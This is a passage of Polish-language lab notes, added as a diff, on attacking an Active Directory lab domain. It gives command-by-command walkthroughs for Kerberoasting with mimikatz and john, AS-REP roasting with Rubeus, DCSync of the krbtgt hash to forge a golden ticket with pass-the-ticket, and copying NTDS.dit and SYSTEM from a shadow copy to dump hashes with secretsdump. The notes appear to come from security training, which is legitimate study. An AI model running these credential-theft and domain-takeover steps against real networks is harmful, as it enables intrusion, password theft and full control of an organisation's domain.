+    http---cyber.local-80:
+
+    Łamanie hasha john
+
+    john kasia2.txt --wordlist=wrd
+
+
+***
+
+II opcja przy pomocy mimikatz (.kirbi)
+
+Windows 10
+
+🔗 -- Download mimikatz
+https://github.com/gentilkiwi/mimikatz
+https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
+
+    Pobrać i rozpakować w katalaogu C:\tools
+
+    Powershell
+
+    klist
+
+    setspn -Q */*
+
+
+    Odpytujemy o usługę SPN "http://cyber.local:80"
+
+    Add-Type -AssemblyNAme System.IdentityModel
+
+    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "http://cyber.local:80"
+
+    klist
+
+    otrzymujemy listę ticketów
+
+
+    Uruchamiamy mimikatz
+
+    cd C:\tools\x64\
+
+    .\mimikatz.exe
+
+    kerberos::list
+
+    kerberos::list /export
+
+    Otrzymujemy pliki .kirbi
+
+    exit
+
+
+    Przenosimy plik 1-40a10000-jessicar@http~~~cyber.local~80-CYBER.LOCAL.kirbi do maszyny Kali
+
+
+    Łamanie hash'a za pomocą john
+
+    kirbi2john 1-40a10000-jessicar\@http~~~cyber.local~80-CYBER.LOCAL.kirbi > kasia_kirbi
+
+    john kasia_kirbi --wordlist=wrd
+
+
+***
+
+### 📋 – Lab03 AS-REP Roasting
+
+    Pobieramy program Rubeus na Windows10
+
+    https://github.com/B1t0n/Rubeus-compiled
+
+    .\Rubeus-1.5.0.exe aspreproast
+
+    Instalujemy .net Framework 3.5
+
+    Na kontrolerze domeny dodać nowego usera (kazik)
+
+    Windows Administrative tools -> Active Directory Users and Computers (dsa.msc) 
+
+    odznaczyć 'User must change password at next logon'
+
+    zaznaczyć w opcjach konta (properties) 'Do not require Kerberos Preauthentication'
+
+    Uruchomić na Windows10
+
+    .\Rubeus-1.5.0.exe asreproast
+
+    .\Rubeus-1.5.0.exe asreproast /format:john /outfile:kazik_tgt.hash
+
+    get-aduser -filter * -Properties DoesNotRequirePreAuth
+
+    get-aduser -filter * -Properties DoesNotRequirePreAuth | where DoesNotRequirePreAuth -eq $true
+
+    Przenieść plik kazik_tgt.hash na kali
+
+    Łamiemy  hasło
+
+    john kazik_tgt.hash --wordlist=wrd
+
+
+***
+
+### 📋 – Lab04 Pass the Ticket
+
+    Na kontrolerze domeny uruchomić powershell
+
+    utworzyć katalog 
+
+    cd /
+
+    mkdir admins
+
+    $group="domain admins"
+
+    net share admins=c:\admins /grant:$group,full
+
+    net user mirek_admin P@ssw0rd /add /domain
+
+    net user mirek_user bB123456! /add /domain
+
+    net group "domain admins" mirek_admin /add /domain
+
+    net user mirek_admin /domain
+
+    net user mirek_user /domain
+
+
+    Na Windowsie 10 zalogować się jako mirek_admin
+
+    Uruchamiamy cmd
+
+    whoami
+
+    pushd \\WIN-1FBN9DQ8AAV\admins
+
+    dir
+
+    exit
+
+    Uruchamiamy ponownie cmd
+
+    klist
+
+    cd /
+
+    cd tools\x64
+
+    mimikatz.exe
+
+    lsadump::dcsync /user:krbtgt
+
+    kerberos::golden /domain:cyber.local /sid:************************** /krbtgt:***hash*** /user:new-admin /group:500 
+
+    gdzie ************************** to sid od "S" do ostatniego "-"
+
+    ***hash*** - hash NTLM usera
+
+    powstanie plik ticket.kirbi
+
+    logujemy się na mirek_user
+
+    Uruchamiamy cmd
+
+    pushd \\WIN-1FBN9DQ8AAV\admins
+
+    cd /
+
+    cd tools\x64
+
+    dir
+
+    mimikatz.exe
+
+    kerberos::ptt ticket.kirbi
+
+    exit
+
+    whami
+
+    klist
+
+    pushd \\WIN-1FBN9DQ8AAV\admins
+
+
+***
+
+### 📋 – Lab05 Extract and Crack NTDS.dit
+
+    Na Windows server uruchamiamy cmd
+
+    vssadmin list shadow
+
+    na c:\windows\ntds\ szukamy bazy ntds.dit
+
+    na c:\windows\system32\config szukamy pliku sam
+
+    create shadow /for=c:
+
+    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\users\jessicar\desktop\ntds.dit
+
+    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system c:\users\jessicar\desktop\system
+
+    esentutl /p c:\users\jessicar\desktop\ntds.dit /!10240 /8 /o
+
+    vssadmin delete /shadow={id_kopii}
+
+    przenosimy pliki ntds.dit i system na kali
+
+
+    Na kalim 
+
+    locate secretsdump.py
+
+    cp /usr/share/doc/python3-impacket/examples/secretsdump.py .
+
+    python3 secretsdump.py -ntds ntds.dit -system system LOCAL
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
